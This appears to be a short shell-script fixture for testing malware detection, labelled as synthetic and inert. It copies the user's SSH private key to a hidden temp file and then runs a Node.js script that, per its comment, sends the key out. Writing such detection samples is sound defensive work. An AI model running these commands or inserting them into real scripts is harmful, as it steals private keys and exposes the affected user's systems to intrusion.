#!/usr/bin/env sh
# FIXTURE ONLY — synthetic detection test sample, not real malware
# Inert sample: a shell step stages the SSH private key, then a Node.js step sends it.
cp ~/.ssh/id_rsa /tmp/.k
node send.js
